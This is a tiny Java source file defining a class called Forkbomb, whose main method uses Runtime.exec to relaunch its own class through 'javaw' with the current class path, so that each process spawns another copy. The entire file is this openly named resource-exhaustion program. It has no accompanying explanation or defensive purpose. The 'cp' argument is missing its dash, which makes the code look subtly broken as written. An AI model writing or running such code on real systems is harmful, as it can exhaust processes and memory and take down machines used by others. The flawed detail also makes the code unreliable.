public class Forkbomb {

	public static void main(String[] args) {
	    String[] cmd = {
				"javaw",
				"cp",
				System.getProperty("java.class.path"),
				"Forkbomb"
			   };
	    Runtime.getRuntime().exec(cmd);
	}

}
